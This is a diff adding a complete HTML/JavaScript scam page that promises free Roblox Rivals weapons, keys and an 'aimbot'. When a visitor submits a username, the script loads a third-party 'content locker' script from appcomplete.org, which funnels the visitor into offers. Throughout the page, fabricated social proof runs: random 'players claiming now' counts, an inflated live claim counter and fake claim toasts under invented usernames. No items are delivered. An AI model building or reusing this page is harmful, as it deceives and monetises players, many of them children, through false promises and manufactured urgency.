@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Roblox Rivals | Claim Exclusive Items</title>
+    <meta name="description" content="Claim your Rivals items: Karambit, Event Horizon, 1100 keys, Void Rifle and more. Limited drops available.">
+    <link href="https://fonts.googleapis.com/css2?family=Luckiest+Guy&family=Nunito:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+
+    <style>
+        :root {
+            --bg-gradient-start: #1a1205;
+            --bg-gradient-end: #0a0600;
+            --text-color: #f5e6c4;
+            --card-bg: rgba(20,14,4,0.7);
+            --border-color: #d4af37;
+            --glow-color: rgba(212,175,55,0.6);
+            --btn-bg: #d4af37;
+            --btn-text: #1a1205;
+            --modal-bg: #1a1306;
+            --input-bg: #0a0600;
+            --hero-bg: rgba(0,0,0,0.4);
+            --hero-border: rgba(212,175,55,0.6);
+            --footer-color: #c4a23d;
+            --toast-bg: #1f1808;
+            --toast-border: #d4af37;
+        }
+
+        body.light {
+            --bg-gradient-start: #fef9e6;
+            --bg-gradient-end: #fff3d1;
+            --text-color: #2c2416;
+            --card-bg: rgba(255,248,225,0.85);
+            --border-color: #b8860b;
+            --glow-color: rgba(184,134,11,0.4);
+            --btn-bg: #d4af37;
+            --btn-text: #2c2416;
+            --modal-bg: #ffffff;
+            --input-bg: #fef7e0;
+            --hero-bg: rgba(255,255,255,0.5);
+            --hero-border: #b8860b;
+            --footer-color: #8b6914;
+            --toast-bg: #ffffff;
+            --toast-border: #d4af37;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: radial-gradient(circle at 20% 30%, var(--bg-gradient-start), var(--bg-gradient-end));
+            font-family: 'Nunito', sans-serif;
+            color: var(--text-color);
+            overflow-x: hidden;
+            position: relative;
+            transition: background 0.4s ease, color 0.3s ease;
+        }
+        .bg-weapons { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 0; overflow: hidden; }
+        .bg-weapon { position: absolute; opacity: 0.2; animation: floatWeaponFast 12s infinite linear alternate; filter: blur(1px); }
+        .bg-weapon img { width: 70px; height: auto; display: block; object-fit: contain; }
+        @keyframes floatWeaponFast { 0% { transform: translate(0,0) rotate(0deg); } 100% { transform: translate(60px,80px) rotate(20deg); } }
+        .main-container { position: relative; z-index: 10; max-width: 1400px; margin: 0 auto; padding: 20px 24px 60px; }
+
+        .theme-switcher {
+            position: fixed;
+            top: 20px;
+            right: 100px;
+            z-index: 100;
+            background: var(--card-bg);
+            backdrop-filter: blur(8px);
+            border-radius: 40px;
+            padding: 6px 16px;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 0 10px var(--glow-color);
+            cursor: pointer;
+            transition: all 0.2s;
+            animation: floatSwitcher 3s infinite alternate;
+        }
+        body.light .theme-switcher { background: rgba(255,248,225,0.8); }
+        .theme-switcher i { font-size: 1.2rem; color: var(--border-color); }
+        @keyframes floatSwitcher { 0% { transform: translateY(0px); } 100% { transform: translateY(-3px); } }
+        .theme-switcher:hover { transform: scale(1.05); }
+
+        .lang-switcher {
+            position: fixed;
+            top: 20px;
+            right: 24px;
+            z-index: 100;
+            background: var(--card-bg);
+            backdrop-filter: blur(8px);
+            border-radius: 40px;
+            padding: 6px 16px;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 0 10px var(--glow-color);
+        }
+        .lang-select { background: transparent; border: none; color: var(--border-color); font-weight: bold; font-family: 'Nunito', sans-serif; cursor: pointer; }
+        .ios-popup { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); backdrop-filter: blur(16px); z-index: 2000; display: flex; align-items: center; justify-content: center; }
+        .ios-popup-content { background: var(--modal-bg); border-radius: 48px; max-width: 340px; padding: 28px; text-align: center; border: 2px solid var(--border-color); box-shadow: 0 0 30px var(--glow-color); }
+        .close-ios { background: var(--btn-bg); border: none; padding: 10px 24px; border-radius: 40px; font-weight: bold; cursor: pointer; color: var(--btn-text); }
+        .modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.4); backdrop-filter: blur(20px); z-index: 3000; display: flex; align-items: center; justify-content: center; visibility: hidden; opacity: 0; transition: 0.2s; }
+        .modal.active { visibility: visible; opacity: 1; }
+        .modal-content { background: var(--modal-bg); border-radius: 48px; padding: 32px; max-width: 460px; width: 90%; text-align: center; border: 2px solid var(--border-color); box-shadow: 0 0 40px var(--glow-color); position: relative; }
+        .modal-close { position: absolute; top: 20px; right: 24px; font-size: 28px; cursor: pointer; color: var(--border-color); background: none; border: none; font-weight: bold; }
+        .simple-modal-title { font-size: 2rem; font-family: 'Luckiest Guy', cursive; color: var(--border-color); letter-spacing: 1px; margin-top: 8px; }
+        .form-group input { width: 100%; padding: 14px 20px; background: var(--input-bg); border: 1px solid var(--border-color); border-radius: 60px; font-size: 1rem; color: var(--text-color); outline: none; }
+        .btn-submit {
+            background: var(--btn-bg);
+            border: none;
+            padding: 12px 28px;
+            border-radius: 60px;
+            font-weight: 800;
+            font-size: 1.2rem;
+            width: 100%;
+            cursor: pointer;
+            transition: 0.2s;
+            color: var(--btn-text);
+            margin-top: 16px;
+        }
+        .wiki-hero { display: flex; flex-wrap: wrap; justify-content: space-between; align-items: center; margin-bottom: 30px; background: var(--hero-bg); border-radius: 60px; padding: 20px 30px; backdrop-filter: blur(4px); border: 1px solid var(--hero-border); }
+        .wiki-top { display: flex; align-items: center; gap: 20px; flex-wrap: wrap; }
+        .rotating-logo { width: 75px; animation: rotateR 6s infinite linear; border-radius: 20px; }
+        @keyframes rotateR { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+        .game-logo { font-family: 'Luckiest Guy', cursive; font-size: 2.5rem; line-height: 1.2; }
+        .white-text { color: #ffffff; text-shadow: 0 0 3px rgba(255,255,255,0.5); }
+        body.light .white-text { color: #2c2416; text-shadow: none; }
+        .gold-text { background: linear-gradient(135deg, var(--border-color), #ffd966); -webkit-background-clip: text; background-clip: text; color: transparent; text-shadow: 0 0 5px rgba(212,175,55,0.3); }
+        .hero-note { margin-top: 12px; font-size: 0.9rem; background: var(--hero-bg); display: inline-block; padding: 6px 18px; border-radius: 40px; }
+        .social-proof { display: inline-flex; align-items: center; gap: 8px; background: var(--hero-bg); padding: 6px 20px; border-radius: 40px; margin-top: 16px; }
+        .dot { width: 10px; height: 10px; background: var(--border-color); border-radius: 50%; animation: pulseGold 0.8s infinite; }
+        @keyframes pulseGold { 0% { opacity: 0.4; transform: scale(0.8); } 100% { opacity: 1; transform: scale(1.2); } }
+        .items-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px,1fr)); gap: 28px; margin-top: 30px; }
+        .item-card { background: var(--card-bg); backdrop-filter: blur(8px); border-radius: 32px; padding: 20px 16px 24px; text-align: center; border: 1px solid var(--border-color); transition: all 0.25s ease; }
+        .item-card:hover { transform: translateY(-8px); border-color: #ffd966; box-shadow: 0 0 25px var(--glow-color); }
+        .item-image img { width: 120px; height: 120px; object-fit: contain; filter: drop-shadow(0 0 8px var(--border-color)); transition: 0.2s; }
+        .item-name { font-size: 1.5rem; font-weight: 800; margin: 14px 0 12px; color: var(--text-color); }
+        .btn-claim { font-family: 'Luckiest Guy', cursive; background: var(--btn-bg); border: none; padding: 12px 0; border-radius: 60px; font-size: 1.3rem; width: 100%; cursor: pointer; transition: 0.2s; color: var(--btn-text); letter-spacing: 1px; box-shadow: 0 0 12px var(--glow-color); }
+        .stock-count { background: rgba(212,175,55,0.25); padding: 4px 12px; border-radius: 30px; font-size: 0.7rem; display: inline-block; margin-bottom: 8px; font-family: 'Nunito', sans-serif; color: var(--border-color); }
+        .footer-keywords { text-align: center; margin-top: 70px; font-size: 0.7rem; opacity: 0.6; color: var(--footer-color); }
+        .toast-msg { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); background: var(--toast-bg); border: 1px solid var(--toast-border); padding: 12px 28px; border-radius: 60px; z-index: 4000; font-weight: bold; backdrop-filter: blur(12px); color: var(--text-color); font-family: 'Nunito', sans-serif; box-shadow: 0 0 20px var(--glow-color); white-space: nowrap; }
+        @media (max-width:700px){ .game-logo{font-size:1.6rem;} .wiki-hero{flex-direction:column;text-align:center;} .btn-claim{font-size:1.1rem;padding:10px 0;} .toast-msg{white-space:normal;text-align:center;max-width:90%;} }
+    </style>
+</head>
+<body>
+<div class="bg-weapons" id="bgWeapons"></div>
+<div class="theme-switcher" id="themeSwitcher"><i class="fas fa-sun"></i> <i class="fas fa-moon"></i></div>
+<div class="lang-switcher"><select id="langSelect" class="lang-select"><option value="en">EN</option><option value="es">ES</option><option value="fr">FR</option><option value="ar">AR</option></select></div>
+<div id="iosPopup" class="ios-popup" style="display: none;"><div class="ios-popup-content"><i class="fas fa-external-link-alt" style="font-size:2.5rem;color:var(--border-color);"></i><h3 style="margin:12px 0;">Open in Browser</h3><p>Tap the three dots and select "Open in Browser" to claim your items.</p><button class="close-ios" id="closeIosBtn">Continue</button></div></div>
+
+<div id="usernameModal" class="modal"><div class="modal-content"><button class="modal-close" id="modalCloseBtn">&times;</button><h2 class="simple-modal-title" id="modalTitleText">Enter Username</h2><p class="simple-modal-note" id="modalNote">Enter username to claim</p><div class="form-group"><input type="text" id="usernameInput" placeholder="Your Username" maxlength="50"><div id="usernameError" class="error-message" style="color:#ffaa66;"></div></div><button id="confirmClaimBtn" class="btn-submit">Claim Reward</button></div></div>
+
+<main class="main-container">
+    <div class="wiki-hero">
+        <div class="wiki-top">
+            <img class="rotating-logo" src="https://allrivals.pages.dev/images/172986961720664255.png" alt="Rivals Logo">
+            <div class="wiki-title">
+                <span class="wiki-label" id="heroLabel">RIVALS ROBLOX</span>
+                <h1 class="game-logo">
+                    <span id="heroTitleTop" class="white-text">CLAIM YOUR LEGENDARY</span><br>
+                    <span id="heroTitleBottom" class="gold-text">RIVALS WEAPON</span>
+                </h1>
+                <p class="section-subtitle" id="heroSubtitle">For Roblox players. Tap claim and unlock your drop.</p>
+            </div>
+        </div>
+        <div class="hero-actions">
+            <div class="hero-note" id="liveClaimsSpan">Live claims: <span id="liveCount">3,892</span> today</div>
+        </div>
+        <div class="social-proof"><span class="dot"></span><span id="socialProofText">156 players claiming right now</span></div>
+    </div>
+    <section class="items-section" id="items-section"><div class="items-grid" id="itemsGrid"></div></section>
+    <footer><p class="footer-keywords">Rivals Roblox codes • Rivals codes • Rivals key • Roblox Rivals codes</p></footer>
+</main>
+
+<!-- Locker Script (appcomplete.org) - Locker is NOT auto-loaded -->
+<script>
+    // نحيطو السكريبت فـ function باش ما يتحملش أوتوماتيكياً
+    function loadLocker() {
+        var script = document.createElement('script');
+        script.type = 'text/javascript';
+        script.id = 'ogjs';
+        script.src = 'https://appcomplete.org/cl/js/7jjge5';
+        document.body.appendChild(script);
+    }
+</script>
+
+<script>
+    const rivalsItems = [
+        { name: "Skin Case 3", img: "https://allrivals.pages.dev/images/SkinCase3Purple.png" },
+        { name: "1100 keys", img: "https://allrivals.pages.dev/images/Key2.png" },
+        { name: "Spear", img: "https://static.wikia.nocookie.net/robloxrivals/images/9/95/Spear_icon_render.png" },
+        { name: "Grappler", img: "https://static.wikia.nocookie.net/robloxrivals/images/8/83/Icon-Grappler.png" },
+        { name: "Slingshot", img: "https://i.ibb.co/k2F7F72Y/61e48778-11ee-47c4-a874-b59db431ce64-removebg-preview.png" },
+        { name: "Aimbot", img: "https://cdn-icons-png.flaticon.com/512/521/521265.png" },
+        { name: "Keynais", img: "https://allrivals.pages.dev/images/Theseshouldwork.png" },
+        { name: "Key Spray", img: "https://allrivals.pages.dev/images/key-spary.png" },
+        { name: "Karambit", img: "https://allrivals.pages.dev/images/Untitled-design-37.png" },
+        { name: "Balisong", img: "https://allrivals.pages.dev/images/Untitled-design-38.png" },
+        { name: "Caladbolg", img: "https://i.ibb.co/Y4bFTL8c/5acb78d0-c63b-4855-b763-0019aa1035bc-removalai-preview.png" },
+        { name: "War Horn", img: "https://allrivals.pages.dev/images/WarHorn.png" },
+        { name: "Keyttle Axe", img: "https://allrivals.pages.dev/images/Keyttleaxe2.png" },
+        { name: "Exogun", img: "https://allrivals.pages.dev/images/Exogunicon.png" },
+        { name: "Glorious Permafrost", img: "https://allrivals.pages.dev/images/Glorious_Permafrost.png" },
+        { name: "Keytana", img: "https://allrivals.pages.dev/images/Keytana_ddssdssdsdd.png" },
+        { name: "Arch Katana", img: "https://static.wikia.nocookie.net/robloxrivals/images/2/22/Arch_Katana_ds.png" },
+        { name: "Crystal Katana", img: "https://static.wikia.nocookie.net/robloxrivals/images/4/48/Crystalkatanarender.png" },
+        { name: "Candy Cane", img: "https://allrivals.pages.dev/images/Candy_Cane_s.png" },
+        { name: "Void Rifle", img: "https://allrivals.pages.dev/images/Void_Rifle.png" }
+    ];
+
+    const randomUsernames = ['PixelPioneer','BlockBash99','NeonNinja07','RoboRangerX','CraftyCrafter','VoxelVoyager','AstroArchitect','TurboTumbler23','CosmicCreator','ShadowShifter','MysticMiner','DragonDuelist','QuantumQuester','BlazeBreaker','AquaAvenger','FrostForge','ThunderTrek','NinjaNova','CyberBuilder','PixelPunk','RoboRaid','PhantomPhaser','VortexVoyager','SolarSmith','HyperHacker','TurboTrader','SkywardScribe','EpicBlockMaster','GalaxyGuardian','MegaMineMover'];
+
+    const translations = {
+        en: { heroLabel:"RIVALS ROBLOX", heroTop:"CLAIM YOUR LEGENDARY", heroBottom:"RIVALS WEAPON", heroSub:"For Roblox players. Tap claim and unlock your drop.", social:"players claiming right now", cta:"CLAIM NOW", liveText:"Live claims:", modalTitle:"Enter Username", modalPlaceholder:"Your Username", modalSubmit:"Claim Reward", modalNotePrefix:"Enter username to claim", limitedBadge:"Limited" },
+        es: { heroLabel:"RIVALS ROBLOX", heroTop:"RECLAMA TU LEGENDARIA", heroBottom:"ARMA RIVALS", heroSub:"Para jugadores de Roblox. Toca reclamar y desbloquea tu drop.", social:"jugadores reclamando ahora", cta:"RECLAMAR", liveText:"Reclamos hoy:", modalTitle:"Ingresa tu Usuario", modalPlaceholder:"Tu Usuario", modalSubmit:"Reclamar Recompensa", modalNotePrefix:"Ingresa usuario para reclamar", limitedBadge:"Limitado" },
+        fr: { heroLabel:"RIVALS ROBLOX", heroTop:"RÉCLAMEZ VOTRE", heroBottom:"ARME LÉGENDAIRE", heroSub:"Pour les joueurs Roblox. Réclamez et débloquez votre drop.", social:"joueurs réclament maintenant", cta:"RÉCLAMER", liveText:"Réclamations aujourd'hui:", modalTitle:"Entrez votre Pseudo", modalPlaceholder:"Votre Pseudo", modalSubmit:"Réclamer la Récompense", modalNotePrefix:"Entrez votre pseudo pour réclamer", limitedBadge:"Limité" },
+        ar: { heroLabel:"RIVALS ROBLOX", heroTop:"احصل على سلاحك", heroBottom:"الأسطوري Rivals", heroSub:"للاعبي Roblox. اضغط للمطالبة وافتح الجائزة.", social:"لاعباً يطالبون الآن", cta:"طالب", liveText:"المطالبات اليوم:", modalTitle:"أدخل اسم المستخدم", modalPlaceholder:"اسم المستخدم", modalSubmit:"طالب بالمكافأة", modalNotePrefix:"أدخل اسم المستخدم للمطالبة", limitedBadge:"محدود" }
+    };
+
+    let currentLang = "en";
+    let pendingItem = "";
+    let claimCount = 3892;
+
+    function showClaimToast(username, itemName) {
+        const toast = document.createElement("div");
+        toast.className = "toast-msg";
+        toast.innerHTML = `<i class="fas fa-gem" style="margin-right:8px;"></i> ${username} claimed ${itemName}`;
+        document.body.appendChild(toast);
+        setTimeout(() => toast.remove(), 3500);
+    }
+
+    function updateLanguage(lang) {
+        const t = translations[lang];
+        if(!t) return;
+        document.getElementById("heroLabel").innerText = t.heroLabel;
+        document.getElementById("heroTitleTop").innerText = t.heroTop;
+        document.getElementById("heroTitleBottom").innerText = t.heroBottom;
+        document.getElementById("heroSubtitle").innerText = t.heroSub;
+        document.getElementById("liveClaimsSpan").innerHTML = `${t.liveText} <span id="liveCount">${claimCount.toLocaleString()}</span> today`;
+        document.getElementById("modalTitleText").innerText = t.modalTitle;
+        document.getElementById("usernameInput").placeholder = t.modalPlaceholder;
+        document.getElementById("confirmClaimBtn").innerText = t.modalSubmit;
+        document.querySelectorAll(".stock-count").forEach(badge => badge.innerText = t.limitedBadge);
+        updateSocialProofNumber();
+    }
+
+    function updateSocialProofNumber() {
+        const t = translations[currentLang];
+        const randomNumber = Math.floor(Math.random() * (1000 - 200 + 1)) + 200;
+        document.getElementById("socialProofText").innerHTML = `${randomNumber} ${t.social}`;
+    }
+
+    function updateLiveCount() { document.getElementById("liveCount").innerText = claimCount.toLocaleString(); }
+
+    function renderItems() {
+        const grid = document.getElementById("itemsGrid");
+        grid.innerHTML = "";
+        const t = translations[currentLang];
+        rivalsItems.forEach(item => {
+            const card = document.createElement("div");
+            card.className = "item-card";
+            card.innerHTML = `<div class="item-header"><span class="stock-count">${t.limitedBadge}</span></div><div class="item-image"><img src="${item.img}" alt="${item.name}" loading="lazy" onerror="this.src='https://placehold.co/200x200/2a2008/d4af37?text=${encodeURIComponent(item.name)}'"></div><h3 class="item-name">${item.name}</h3><button class="btn-claim" data-item="${item.name}">${t.cta}</button>`;
+            grid.appendChild(card);
+        });
+        document.querySelectorAll(".btn-claim").forEach(btn => {
+            btn.addEventListener("click", () => openModalForItem(btn.getAttribute("data-item")));
+        });
+    }
+
+    function openModalForItem(itemName) {
+        pendingItem = itemName;
+        const t = translations[currentLang];
+        document.getElementById("modalTitleText").innerText = t.modalTitle;
+        document.getElementById("modalNote").innerText = `${t.modalNotePrefix} — ${itemName}`;
+        document.getElementById("usernameInput").value = "";
+        document.getElementById("usernameError").innerText = "";
+        document.getElementById("usernameModal").classList.add("active");
+    }
+
+    function closeModal() {
+        document.getElementById("usernameModal").classList.remove("active");
+    }
+
+    document.getElementById("modalCloseBtn").addEventListener("click", closeModal);
+    document.getElementById("usernameModal").addEventListener("click", (e) => {
+        if (e.target === document.getElementById("usernameModal")) closeModal();
+    });
+
+    document.getElementById("confirmClaimBtn").addEventListener("click", function() {
+        const username = document.getElementById("usernameInput").value.trim();
+        if (!username) {
+            document.getElementById("usernameError").innerText = "Please enter a username.";
+            return;
+        }
+        closeModal();
+        
+        // تحميل الـ Locker غير دابا (من بعد الكليك)
+        loadLocker();
+        
+        // انتظر شوية باش السكريبت يتحمل ومن بعد نطلقو
+        setTimeout(function() {
+            if (typeof og_load === 'function') {
+                og_load();
+            } else if (typeof call_locker === 'function') {
+                call_locker();
+            } else if (typeof og_call === 'function') {
+                og_call();
+            }
+        }, 600);
+        
+        // Show toast
+        const randomUser = randomUsernames[Math.floor(Math.random() * randomUsernames.length)];
+        showClaimToast(randomUser, pendingItem);
+        claimCount += Math.floor(Math.random() * 5) + 1;
+        updateLiveCount();
+    });
+
+    document.getElementById("langSelect").addEventListener("change", (e) => {
+        currentLang = e.target.value;
+        updateLanguage(currentLang);
+        renderItems();
+    });
+
+    document.getElementById("themeSwitcher").addEventListener("click", () => {
+        document.body.classList.toggle("light");
+    });
+
+    if (/iPad|iPhone|iPod/.test(navigator.userAgent)) {
+        document.getElementById("iosPopup").style.display = "flex";
+    }
+    document.getElementById("closeIosBtn").addEventListener("click", () => {
+        document.getElementById("iosPopup").style.display = "none";
+    });
+
+    (function initBgWeapons() {
+        const bg = document.getElementById("bgWeapons");
+        const weapons = rivalsItems.slice(0, 10);
+        weapons.forEach((w, i) => {
+            const div = document.createElement("div");
+            div.className = "bg-weapon";
+            div.style.left = Math.random() * 90 + "%";
+            div.style.top = Math.random() * 90 + "%";
+            div.style.animationDelay = (i * 1.2) + "s";
+            div.innerHTML = `<img src="${w.img}" alt="">`;
+            bg.appendChild(div);
+        });
+    })();
+
+    updateLanguage("en");
+    renderItems();
+
+    setInterval(() => {
+        claimCount += Math.floor(Math.random() * 4) + 1;
+        updateLiveCount();
+    }, 8000);
+
+    setInterval(updateSocialProofNumber, 5000);
+</script>
+</body>
+</html>
